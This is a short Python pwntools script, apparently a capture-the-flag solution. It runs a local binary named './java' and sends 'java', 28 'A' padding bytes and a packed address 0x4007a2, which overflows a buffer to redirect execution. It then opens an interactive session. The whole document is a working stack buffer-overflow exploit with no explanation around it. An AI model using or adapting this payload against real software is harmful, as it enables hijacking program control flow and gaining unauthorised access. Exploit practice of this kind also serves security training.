import pwn

p = pwn.process('./java')
p.sendline(b'java' + b'A' * 28 + pwn.p64(0x4007a2))
p.interactive()